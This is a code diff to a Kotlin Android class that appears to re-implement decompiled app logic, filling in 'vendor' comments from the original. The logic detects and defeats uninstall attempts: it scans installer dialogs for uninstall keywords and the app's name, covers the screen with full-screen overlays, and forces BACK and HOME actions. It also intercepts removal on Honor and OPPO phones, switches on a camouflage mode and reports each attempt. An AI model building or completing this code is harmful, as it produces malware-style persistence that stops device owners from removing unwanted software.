@@ -45,15 +45,20 @@ class IndexedRunnable2(
                     // Gets root node, checks package name:
                     // - If launcher/home → log and wait for next long-press
                     // - If dangerous package → restart polling
+                    // vendor: gets rootInActiveWindow via getRootNodeProvider, checks package name:
+                    // if launcher/home → log "仍在桌面" and wait for next long-press trigger
+                    // if dangerous package → call parent.startPolling(packageName)
+                    // Requires service reference for getRootInActiveWindow().
                     Log.d(TAG, "case=0: post-overlay package check")
-                    // ADAPT: Complex logic involving getRootInActiveWindow
                 }
                 1 -> {
                     // JADX case 1: Installer popup uninstall detection
                     // Searches for "卸载/Uninstall/移除/Remove" keywords
                     // Then searches for app name → if found, trigger overlay (case 2)
+                    // vendor: gets rootInActiveWindow, searches for "卸载/Uninstall/移除/Remove" keywords,
+                    // then searches for app name → if found, posts case 2 (showFullscreenOverlay).
+                    // Recycles all found nodes after checking.
                     Log.d(TAG, "case=1: installer popup uninstall detection")
-                    // ADAPT: Accessibility node search for uninstall keywords
                 }
                 2 -> {
                     // JADX case 2: Show full-screen overlay
@@ -64,8 +69,9 @@ class IndexedRunnable2(
                     // JADX case 3: Desktop→installer confirm popup check
                     // Searches for app name in installer confirm dialog
                     // If found → trigger overlay (case 7) + report
+                    // vendor: gets rootInActiveWindow, searches for app name in installer confirm dialog,
+                    // if found → posts case 7 (showFullscreenOverlay) + report "桌面→安装器确认弹窗含APP名"
                     Log.d(TAG, "case=3: desktop→installer confirm check")
-                    // ADAPT: Accessibility node search
                 }
                 4 -> {
                     // JADX case 4: Remove overlay
@@ -110,8 +116,11 @@ class IndexedRunnable2(
                     // Sleep 50ms, getRootInActiveWindow, try click "从桌面移除"
                     // If not found → BACK
                     // Then trigger camouflage + report
+                    // vendor: nk1 case 12 — sleep(50ms), getRootInActiveWindow,
+                    // try C0355a0.m211906a0 to click "从桌面移除", if not found → performGlobalAction(BACK) + sleep(100ms),
+                    // then enableCamouflageMode + report.
+                    // Requires service reference for getRootInActiveWindow() and performGlobalAction().
                     Log.d(TAG, "case=12: Honor uninstall intercept")
-                    // ADAPT: Honor-specific accessibility logic
                     parent.triggerCamouflage()
                     parent.reportDetection(
                         "PKGINSTALLER_INTERCEPT",
@@ -123,8 +132,9 @@ class IndexedRunnable2(
                 }
                 13 -> {
                     // JADX case 13: BACK + sleep(100ms) + HOME
+                    // vendor: nk1 case 13 — performGlobalAction(BACK) + sleep(100ms) + performGlobalAction(HOME)
+                    // Requires service reference (dqtvuisjd) for performGlobalAction().
                     Log.d(TAG, "case=13: BACK+HOME")
-                    // ADAPT: serviceRef.performGlobalAction(BACK) + sleep + performGlobalAction(HOME)
                 }
                 14 -> {
                     // JADX case 14: OPPO uninstall intercept — camouflage + report
@@ -140,8 +150,9 @@ class IndexedRunnable2(
                 15 -> {
                     // JADX case 15: Single BACK action
                     // serviceRef.performGlobalAction(1) // GLOBAL_ACTION_BACK
+                    // vendor: nk1 case 15 — performGlobalAction(1) // GLOBAL_ACTION_BACK
+                    // Requires service reference (dqtvuisjd) for performGlobalAction().
                     Log.d(TAG, "case=15: single BACK")
-                    // ADAPT: serviceRef.performGlobalAction(GLOBAL_ACTION_BACK)
                 }
                 else -> {
                     // JADX default: Full-screen overlay + camouflage + report
